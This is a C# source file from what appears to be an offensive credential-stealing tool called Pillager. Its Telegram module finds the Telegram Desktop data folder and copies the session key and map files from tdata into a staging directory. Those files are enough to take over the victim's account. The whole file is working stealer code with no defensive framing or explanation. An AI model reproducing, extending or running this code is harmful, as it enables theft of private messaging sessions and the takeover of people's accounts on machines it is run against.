using Pillager.Helper;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;

namespace Pillager.IM
{
    internal class Telegram
    {
        public static string IMName = "Telegram";

        public static string IMPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Telegram Desktop");

        public static void Save(string path)
        {
            if (!Directory.Exists(IMPath)) return;
            string savepath = Path.Combine(path, IMName);
            Directory.CreateDirectory(savepath);
            string[] sessionpaths =
            {
                "tdata\\key_datas",
                "tdata\\D877F783D5D3EF8Cs",
                "tdata\\D877F783D5D3EF8C\\maps",
                "tdata\\A7FDF864FBC10B77s",
                "tdata\\A7FDF864FBC10B77\\maps",
                "tdata\\F8806DD0C461824Fs",
                "tdata\\F8806DD0C461824F\\maps",
                "tdata\\C2B05980D9127787s",
                "tdata\\C2B05980D9127787\\maps",
                "tdata\\0CA814316818D8F6s",
                "tdata\\0CA814316818D8F6\\maps",
            };
            Directory.CreateDirectory(Path.Combine(savepath, "tdata")); 
            Directory.CreateDirectory(savepath + "\\tdata\\D877F783D5D3EF8C");
            Directory.CreateDirectory(savepath + "\\tdata\\A7FDF864FBC10B77");
            Directory.CreateDirectory(savepath + "\\tdata\\F8806DD0C461824F");
            Directory.CreateDirectory(savepath + "\\tdata\\C2B05980D9127787");
            Directory.CreateDirectory(savepath + "\\tdata\\0CA814316818D8F6");
            foreach (var sessionpath in sessionpaths)
            {
                if (File.Exists(Path.Combine(IMPath, sessionpath)))
                {
                    File.Copy(Path.Combine(IMPath, sessionpath), Path.Combine(savepath, sessionpath),true);
                }
            }
        }
    }
}
